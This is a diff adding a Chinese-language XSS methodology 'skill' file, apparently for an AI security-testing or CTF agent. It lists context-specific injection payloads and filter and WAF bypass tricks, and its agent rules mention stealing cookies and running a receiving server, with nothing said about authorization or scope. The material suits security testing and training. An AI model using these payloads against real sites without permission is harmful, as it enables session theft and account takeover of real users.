@@ -1,0 +1,83 @@
+---
+name: xss-methodology
+description: "反射型/存储型/DOM XSS 的检测、利用和绕过。当 Web 应用有用户输入回显（搜索/评论/表单/URL参数）、或发现存储型内容输出点时使用。包含上下文分析决策树、WAF绕过技巧、CSP绕过方法、DOM Clobbering、mXSS、SVG XSS。优先于其他漏洞测试——XSS 是最低成本的高危漏洞，发现后立即构造 PoC"
+metadata:
+  tags: "xss,cross-site scripting,injection,bypass,dom,reflected,stored,csp"
+  category: "exploit"
+  mitre_attack: "T1189,T1059.007"
+category: 漏洞利用
+author: wgpsec
+source: https://github.com/wgpsec/AboutSecurity/tree/main/skills/exploit/web-method/xss-methodology
+---
+
+# XSS 跨站脚本完整方法论
+
+## ⛔ 深入参考（遇到 WAF/CSP 时必读）
+
+- WAF/过滤绕过 payload 大全、CSP 绕过进阶、DOM Clobbering、mXSS、SVG XSS、存储型/DOM XSS → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)
+- CSP 绕过与 DOM XSS 深入技术 → [references/csp-bypass-and-dom-xss.md](references/csp-bypass-and-dom-xss.md)
+
+---
+
+## Phase 0: 回显点发现（最先执行！）
+
+1. 每个参数发送唯一标记（`xss123test`），在响应中搜索
+2. 不仅检查 HTML body，也检查响应头（`Location:`, `Set-Cookie:`）
+3. 常见：搜索结果页、错误页面、用户资料页
+
+## Phase 1: 上下文分析（决定 payload）
+
+| 上下文 | 示例 | 基础 Payload |
+|--------|------|-------------|
+| HTML 标签间 | `<div>INJECT</div>` | `<script>alert(1)</script>` |
+| 属性值（双引号） | `<input value="INJECT">` | `" onfocus=alert(1) autofocus="` |
+| 属性值（单引号） | `<input value='INJECT'>` | `' onfocus=alert(1) autofocus='` |
+| JavaScript 字符串 | `var x="INJECT"` | `";alert(1)//` |
+| URL/href | `<a href="INJECT">` | `javascript:alert(1)` |
+| JS 模板字面量 | `` var x=`INJECT` `` | `${alert(1)}` 或 `` `+alert(1)+` `` |
+
+**关键**：不同上下文需要不同 payload！先确定上下文再选择。
+
+## Phase 2: 基础 XSS 测试
+
+```
+1. <script>alert(1)</script>
+2. <img src=x onerror=alert(1)>      ← script 被过滤时
+3. <svg onload=alert(1)>
+4. " onfocus=alert(1) autofocus="    ← 属性注入
+```
+
+**验证**：检查响应 HTML 中 payload 是否被原样保留（未编码）。`<` 变成 `&lt;` → 已转义，换参数。
+
+## Phase 3: 绕过与高级利用
+
+遇到 WAF/过滤 → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)
+
+速查：
+- `<script>` 被过滤 → `<img>`, `<svg>`, `<details>`, `<video>`
+- `alert` 被过滤 → `confirm()`, `prompt()`, `print()`
+- `()` 被过滤 → `` alert`1` ``
+- CSP 限制 → 检查 `unsafe-inline` / nonce / JSONP 端点
+
+## 注意事项
+- **先测回显再测注入**：没有回显就没有 XSS
+- **HTTP-only Cookie 无法通过 XSS 窃取**
+- 记录每个参数的编码行为
+
+## ⛔ Agent 行为规则
+
+### ⛔ NEVER
+- NEVER 在未确认 XSS 类型（反射/存储/DOM）前盲目发 payload
+- NEVER 遇到 WAF 过滤不读 references — 必须读完整绕过清单再继续
+- NEVER 在同一个 payload 变体上重试超过 3 次
+
+### ✅ ALWAYS
+- ALWAYS 先确认注入点上下文（HTML 标签内/属性内/JS 内/URL 内）
+- ALWAYS 从最简单 payload 开始：`<script>alert(1)</script>` → 事件处理 → 编码绕过
+- ALWAYS 遇到 WAF/CSP 时读 references/xss-bypass-and-types.md
+- ALWAYS 确认 flag 提取方式：XSS 场景通常需要窃取 cookie 或读取页面内容
+
+### 🔧 工具偏好
+1. `http_request` — XSS 测试（精确控制注入参数）
+2. 读取 references 文件 — 遇到 WAF/CSP 时读绕过参考
+3. `python3` — 编码 payload 或启动接收服务器
